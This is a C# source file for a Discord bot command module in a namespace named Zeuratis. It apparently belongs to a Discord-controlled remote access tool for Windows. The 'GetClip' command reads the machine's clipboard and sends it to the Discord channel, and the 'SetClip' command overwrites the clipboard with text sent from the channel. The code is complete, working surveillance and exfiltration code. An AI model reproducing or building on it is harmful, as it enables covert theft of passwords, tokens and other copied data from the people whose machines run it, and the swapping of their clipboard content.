namespace Zeuratis;

[SupportedOSPlatform("windows")]
public class ClipBoardCommands : ModuleBase<SocketCommandContext>
{
    [Command("GetClip")]
    public async Task GetClipBoard()
    {
        String text = "";
        Thread staThrd = new(delegate ()
        {
            text = Clipboard.GetText(TextDataFormat.Text);
        });
        staThrd.SetApartmentState(ApartmentState.STA);
        staThrd.Start();
        staThrd.Join();

        await ReplyAsync(text);
    }

    [Command("SetClip")]
    public async Task SetClip(String text)
    {
        Thread staThrd = new(delegate ()
        {
            Clipboard.SetText(text);
        });
        staThrd.SetApartmentState(ApartmentState.STA);
        staThrd.Start();
        staThrd.Join();

        await ReplyAsync("Set ClipBoard To: " + text);
    }
}
